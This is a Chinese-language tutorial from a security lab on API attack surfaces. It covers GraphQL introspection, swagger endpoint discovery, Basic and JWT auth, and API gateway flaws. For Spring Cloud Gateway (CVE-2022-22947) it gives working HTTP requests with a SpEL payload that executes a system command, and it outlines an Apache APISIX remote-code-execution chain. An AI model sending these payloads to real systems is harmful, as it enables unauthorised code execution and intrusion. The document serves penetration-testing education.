@深信服-深蓝攻防实验室-zxcvbn
# 必要性
前后端分离已经成为web的一大趋势，通过Tomcat+Ngnix(也可以中间有个Node.js)，有效地进行解耦。并且前后端分离会为以后的大型分布式架构、弹性计算架构、微服务架构、多端化服务（多种客户端，例如：浏览器，车载终端，安卓，IOS等等）打下坚实的基础。而API就承担了前后端的通信的职责。所以学习api安全很有必要。  
本文的思路在于总结一些api方面常见的攻击面。笔者在这块也尚在学习中，如有错误，还望各位斧正。
# 常见的api技术
## GraphQL
GraphQL 是一个用于 API 的查询语言  
通常有如下特征：  
（1）数据包都是发送至/graphql接口  
（2）其中包含了很多换行符\n
    {"query":"\n    query IntrospectionQuery {\r\n      __schema {\r\n        queryType { name }\r\n        mutationType { name }\r\n        subscriptionType { name }\r\n        types {\r\n          ...FullType\r\n        }\r\n        directives {\r\n          name\r\n          description\r\n          locations\r\n          args {\r\n            ...InputValue\r\n          }\r\n        }\r\n      }\r\n    }\r\n\r\n    fragment FullType on __Type {\r\n      kind\r\n      name\r\n      description\r\n      fields(includeDeprecated: true) {\r\n        name\r\n        description\r\n        args {\r\n          ...InputValue\r\n        }\r\n        type {\r\n          ...TypeRef\r\n        }\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      inputFields {\r\n        ...InputValue\r\n      }\r\n      interfaces {\r\n        ...TypeRef\r\n      }\r\n      enumValues(includeDeprecated: true) {\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      possibleTypes {\r\n        ...TypeRef\r\n      }\r\n    }\r\n\r\n    fragment InputValue on __InputValue {\r\n      name\r\n      description\r\n      type { ...TypeRef }\r\n      defaultValue\r\n    }\r\n\r\n    fragment TypeRef on __Type {\r\n      kind\r\n      name\r\n      ofType {\r\n        kind\r\n        name\r\n        ofType {\r\n          kind\r\n          name\r\n          ofType {\r\n            kind\r\n            name\r\n            ofType {\r\n              kind\r\n              name\r\n              ofType {\r\n                kind\r\n                name\r\n                ofType {\r\n                  kind\r\n                  name\r\n                  ofType {\r\n                    kind\r\n                    name\r\n                  }\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }\r\n  ","variables":null}
## SOAP-WSDL
    WSDL (Web Services Description Language,Web服务描述语言)是一种XML Application，他将Web服务描述定义为一组服务访问点，客户端可以通过这些服务访问点对包含面向文档信息或面向过程调用的服务进行访问
走的是SOAP协议，一般发送的xml格式的数据，然后会有WSDL文件  
.net中常见的.asmx文件也有wsdl格式 xxx.asmx?wsdl  
我们可以使用soapui对这类api进行测试
## WADL
文件里面有很明显的wadl标志
同样也可以用soapui的rest功能进行测试
## REST
rest api并不像前面几种那种特征明显，也是如今使用最多的一种api技术
    REST 是一组架构规范，并非协议或标准。API 开发人员可以采用各种方式实施 REST。
    当客户端通过 RESTful API 提出请求时，它会将资源状态表述传递给请求者或终端。该信息或表述通过 HTTP 以下列某种格式传输：JSON（Javascript 对象表示法）、HTML、XLT、Python、PHP 或纯文本。JSON 是最常用的编程语言，尽管它的名字英文原意为“JavaScript 对象表示法”，但它适用于各种语言，并且人和机器都能读。 
    还有一些需要注意的地方：头和参数在 RESTful API HTTP 请求的 HTTP 方法中也很重要，因为其中包含了请求的元数据、授权、统一资源标识符（URI）、缓存、cookie 等重要标识信息。有请求头和响应头，每个头都有自己的 HTTP 连接信息和状态码。
# 获取端点的方式
对于api的一些安全测试，通常关注api的权限问题，api端点和基础设施的安全问题。  
要测试api端点的安全问题，肯定得尽量获取多的api端点
## swagger api-docs泄露
Swagger 是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务  
常见指纹：
    # swagger 2
    /swagger-ui.html
    /api-docs
    /v2/api-docs
    # swagger 3
    /swagger-ui/index.html
    /api-docs
    /v2/api-docs
    /v3/api-docs
    ...
api-docs可泄露所有端点信息  
这里推荐两个工具进行测试  
第一个是swagger-editor  
下载之后打开index.html就可以用，可以选择导入或者远程加载url，支持json和yaml格式的api-docs  
第二个是apikit   
burp插件  
## graphql内省查询
获取所有端点信息  
    {"query":"\n    query IntrospectionQuery {\r\n      __schema {\r\n        queryType { name }\r\n        mutationType { name }\r\n        subscriptionType { name }\r\n        types {\r\n          ...FullType\r\n        }\r\n        directives {\r\n          name\r\n          description\r\n          locations\r\n          args {\r\n            ...InputValue\r\n          }\r\n        }\r\n      }\r\n    }\r\n\r\n    fragment FullType on __Type {\r\n      kind\r\n      name\r\n      description\r\n      fields(includeDeprecated: true) {\r\n        name\r\n        description\r\n        args {\r\n          ...InputValue\r\n        }\r\n        type {\r\n          ...TypeRef\r\n        }\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      inputFields {\r\n        ...InputValue\r\n      }\r\n      interfaces {\r\n        ...TypeRef\r\n      }\r\n      enumValues(includeDeprecated: true) {\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      possibleTypes {\r\n        ...TypeRef\r\n      }\r\n    }\r\n\r\n    fragment InputValue on __InputValue {\r\n      name\r\n      description\r\n      type { ...TypeRef }\r\n      defaultValue\r\n    }\r\n\r\n    fragment TypeRef on __Type {\r\n      kind\r\n      name\r\n      ofType {\r\n        kind\r\n        name\r\n        ofType {\r\n          kind\r\n          name\r\n          ofType {\r\n            kind\r\n            name\r\n            ofType {\r\n              kind\r\n              name\r\n              ofType {\r\n                kind\r\n                name\r\n                ofType {\r\n                  kind\r\n                  name\r\n                  ofType {\r\n                    kind\r\n                    name\r\n                  }\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }\r\n  ","variables":null}
我们可以用这个生成接口文档：  
需要nodejs test.json是刚刚内省查询返回的json格式数据
    npm install -g @2fd/graphdoc
    graphdoc -s ./test.json -o ./doc/schema
然后我们打开生成的/doc/index.html  
根据他这个格式构造数据包就行了  
## 其他
在黑盒测试中，很大一个问题就是api端点找得不够全，我们需要从对应的应用或者从其他方面找  
（1）web  
js html等静态资源可以有一些api端点  
burp插件JS LinkFinder可以被动收集  
（2）app和其他客户端应用  
（3）github  
（4）根据规律fuzz
# 鉴权方式
## Basic Auth
每次请求API时都提供用户的username和password  
通常在http数据包中有一个Authorization头
    Authorization: Basic base64(username:password)
这个安全性比较低，现在很少用到
## JWT
jwt（json web token）是一种基于 Token 的认证授权机制  
分为三部分
  * **Header** : 描述 JWT 的元数据，定义了生成签名的算法以及 Token 的类型。
  * **Payload** : 用来存放实际需要传递的数据
  * **Signature（签名）** ：服务器通过 Payload、Header 和一个密钥(Secret)使用 Header 里面指定的签名算法（默认是 HMAC SHA256）生成 防止 JWT被篡改 
计算方式 加密算法( base64(header) + "." + base64(payload), secret)  
在线测试  
普通token需要后端存储与用户的对应关系，而JWT自身携带对应关系
## 其他自定义头、cookie
诸如apikey 或者随机生成的其他形式的token
# 常见安全问题及测试方法
## api网关
    API 网关是一个搭建在客户端和微服务之间的服务，我们可以在 API 网关中处理一些非业务功能的逻辑，例如权限验证、监控、缓存、请求路由等。
    API 网关就像整个微服务系统的门面一样，是系统对外的唯一入口。有了它，客户端会先将请求发送到 API 网关，然后由 API 网关根据请求的标识信息将请求转发到微服务实例。
### apisix
    Apache APISIX 是 Apache 软件基金会下的云原生 API 网关，它兼具动态、实时、高性能等特点，提供了负载均衡、动态上游、灰度发布（金丝雀发布）、服务熔断、身份认证、可观测性等丰富的流量管理功能。我们可以使用 Apache APISIX 来处理传统的南北向流量，也可以处理服务间的东西向流量。同时，它也支持作为 K8s Ingress Controller 来使用。
apisix之前爆出过一个命令执行漏洞CVE-2022-24112 （目前最新版本是3.0）  
影响范围：
    Apache APISIX 1.3 ~ 2.12.1 之间的所有版本（不包含 2.12.1 ）
    Apache APISIX 2.10.0 ~ 2.10.4 LTS 之间的所有版本（不包含 2.10.4）
搭建漏洞环境
    git clone https://github.com/twseptian/cve-2022-24112 ##获取dockerfile文件
    cd cve-2022-24112/apisix-docker/example/ ##进入相应目录
    docker-compose -p docker-apisix up -d ##启动基于docker的apisix所有服务
利用条件
    batch-requests插件默认开启状态。
    用户使用了 Apache APISIX 默认配置（启用 Admin API ，使用默认 Admin Key 且没有额外分配管理端口），攻击者可以通过 batch-requests 插件调用 Admin API 。
攻击思路
    1、利用batch-requests 插件漏洞、绕过请求头检测；
    2、通过伪造请求头、向Admin API 注册路由；
    3、注册路由时、携带参数filter_func 传递 lua代码、造成远程代码执行漏洞
exp：  
### Spring Cloud Gateway
    Spring Cloud Gateway 是 Spring Cloud 团队基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的高性能 API 网关组件
当Spring Cloud Gateway启用和暴露 Gateway Actuator 端点时，使用 Spring Cloud Gateway
的应用程序可受到代码注入攻击  
影响版本
    Spring Cloud Gateway < 3.1.1
    Spring Cloud Gateway < 3.0.7
    Spring Cloud Gateway 其他已不再更新的版本
这个漏洞本身是一个SpEL注入  
攻击方法：  
第一步 添加路由 value参数传入了执行cmd的el表达式
    POST /test/actuator/gateway/routes/AAAAAAAAAAAAAAAA HTTP/1.1
    Host: xxx.com:9090
    User-Agent: xxx
    Content-Length: xxx
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Content-Type: application/json
    Accept-Encoding: gzip, deflate
    Connection: close
    {
      "id": "AAAAAAAAAAAAAAAA",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {
          "name": "Result",
          "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()))}"
        }
      }],
      "uri": "http://xxx.com:9090/test/actuator/"
    }
第二步 刷新配置
    POST /test/actuator/gateway/refresh HTTP/1.1
    Host: xxx:9090
    User-Agent: xxx
    Content-Length: 0
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Content-Type: application/x-www-form-urlencoded